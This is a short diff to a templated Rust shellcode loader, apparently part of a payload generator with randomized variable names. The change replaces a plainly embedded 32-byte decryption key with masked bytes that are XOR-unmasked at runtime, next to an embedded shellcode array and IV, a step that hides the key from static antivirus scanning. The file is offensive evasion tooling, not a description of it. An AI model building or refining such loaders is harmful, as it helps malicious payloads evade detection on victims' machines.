@@ -45,9 +45,10 @@ unsafe fn {{ v.fn_run }}() {
     let {{ v.var_shellcode }}: &[u8] = &[
         {%- for byte in config.shellcode_hex | hex_bytes %}{{ byte }},{% endfor %}
     ];
-    let {{ v.var_key }}: [u8; 32] = [
-        {%- for byte in config.key_hex | hex_bytes %}{{ byte }},{% endfor %}
+    let mut {{ v.var_key }}: [u8; 32] = [
+        {%- for byte in masked_key_bytes %}{{ byte }},{% endfor %}
     ];
+    for {{ v.bin_lv_ki }} in &mut {{ v.var_key }} { *{{ v.bin_lv_ki }} ^= {{ key_tweak }} as u8; }
     let {{ v.var_iv }}: [u8; 16] = [
         {%- for byte in config.iv_hex | hex_bytes %}{{ byte }},{% endfor %}
     ];
